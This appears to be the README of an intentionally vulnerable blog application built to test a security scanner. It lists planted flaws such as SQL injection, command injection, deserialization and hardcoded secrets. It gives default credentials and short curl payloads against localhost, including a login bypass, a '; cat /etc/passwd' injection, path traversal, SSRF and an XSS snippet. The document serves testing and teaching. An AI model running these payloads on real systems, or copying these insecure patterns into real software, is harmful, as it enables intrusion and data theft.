# Vulnerable Blog Application 🚨

**⚠️ WARNING: This application is INTENTIONALLY VULNERABLE for security testing purposes. DO NOT deploy to production or expose to the internet!**

## Purpose

This is a deliberately vulnerable web application designed to test the Security Guardian scanning tool. It contains 26+ security vulnerabilities across multiple categories.

## Vulnerabilities Included

### Backend (Python/Flask)

1. **Hardcoded Secrets** - API keys, AWS credentials, JWT secrets in code
2. **SQL Injection** - Multiple endpoints with string concatenation queries
3. **Command Injection** - Ping endpoint executes unsanitized shell commands
4. **Path Traversal** - File download endpoint allows directory traversal
5. **Insecure Deserialization** - Pickle deserialization of user input
6. **Weak Cryptography** - MD5 password hashing, Base64 as "encryption"
7. **Information Disclosure** - Debug endpoint exposes environment variables
8. **Missing Authentication** - Unprotected endpoints
9. **Missing Authorization** - IDOR vulnerabilities, users can delete any post
10. **CSRF Missing** - No CSRF tokens on state-changing operations
11. **Mass Assignment** - User update allows setting is_admin flag
12. **XXE Vulnerability** - XML parsing without safeguards
13. **Open Redirect** - Redirect endpoint with no validation
14. **Timing Attack** - Insecure string comparison in admin verification
15. **Sensitive Data in Logs** - Passwords and tokens logged
16. **SSRF** - URL fetch endpoint with no validation
17. **Weak Random** - Predictable token generation
18. **Debug Mode Enabled** - Flask debug mode in production
19. **Plain Text Passwords** - No password hashing for default users
20. **Insecure CORS** - Allows all origins with credentials
21. **YAML Unsafe Load** - Code execution via YAML deserialization
22. **Eval Usage** - Arbitrary code execution in utils
23. **Race Conditions** - Unsafe file operations
24. **No Rate Limiting** - Brute force attacks possible

### Frontend (React/TypeScript)

25. **Hardcoded API Keys** - Stripe, Firebase keys in source code
26. **XSS via dangerouslySetInnerHTML** - Renders unsanitized HTML
27. **Inline Scripts** - CSP bypass potential
28. **Insecure Token Storage** - localStorage (vulnerable to XSS)
29. **Console.log Leaks** - Credentials logged to browser console
30. **Exposed Source Maps** - Production builds include source maps
31. **Sensitive Data in .env** - Committed credentials
32. **No Input Validation** - User input passed directly to backend
33. **Missing CSRF Tokens** - Forms don't include CSRF protection

## Quick Start

### Using Docker Compose
```bash
cd vulnerable-app
docker-compose up --build
```

Access:
- Frontend: http://localhost:3000
- Backend API: http://localhost:5000

### Manual Setup

**Backend:**
```bash
cd backend
pip install -r requirements.txt
python app.py
```

**Frontend:**
```bash
cd frontend
npm install
npm run dev
```

## Test Credentials

- **Admin**: username=`admin`, password=`admin`
- **User**: username=`user`, password=`password`

## Testing Vulnerabilities

### SQL Injection
```bash
# Login bypass
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "x OR 1=1--"}'

# Search injection
curl "http://localhost:5000/api/posts/search?q=test' OR '1'='1"
```

### Command Injection
```bash
curl -X POST http://localhost:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "localhost; cat /etc/passwd"}'
```

### Path Traversal
```bash
curl "http://localhost:5000/api/files/../../../etc/passwd"
```

### SSRF
```bash
curl -X POST http://localhost:5000/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:5000/api/debug/env"}'
```

### XSS
Create a post with:
```html
<img src=x onerror="alert('XSS')">
```

## Scanning with Security Guardian

1. Push this code to a GitHub repository
2. Run Security Guardian scan:
```bash
curl -X POST "http://localhost:8000/scan?repo_url=https://github.com/yourusername/vulnerable-app"
```

Expected Results:
- **Semgrep**: ~15-20 SAST findings
- **Trivy**: Secret detection (API keys, passwords)
- **Total Scan Time**: Under 2 minutes
- **Remediation**: AI-generated fixes for all issues

## File Structure

```
vulnerable-app/
├── backend/
│   ├── app.py              # Main Flask app (most vulnerabilities here)
│   ├── utils.py            # Vulnerable utility functions
│   ├── config.yaml         # Hardcoded credentials
│   ├── .env                # Exposed environment secrets
│   ├── requirements.txt
│   └── Dockerfile
├── frontend/
│   ├── src/
│   │   ├── App.tsx         # React app with XSS, hardcoded secrets
│   │   ├── main.tsx
│   │   ├── App.css
│   │   └── index.css
│   ├── index.html          # Inline scripts with credentials
│   ├── vite.config.ts      # Insecure build config
│   ├── package.json
│   ├── tsconfig.json
│   └── Dockerfile
├── docker-compose.yml
└── README.md
```

## Educational Use Only

This application demonstrates common security anti-patterns and is intended solely for:
- Testing security scanning tools
- Educational demonstrations
- Penetration testing practice in isolated environments

**Never deploy this application to any public-facing environment.**
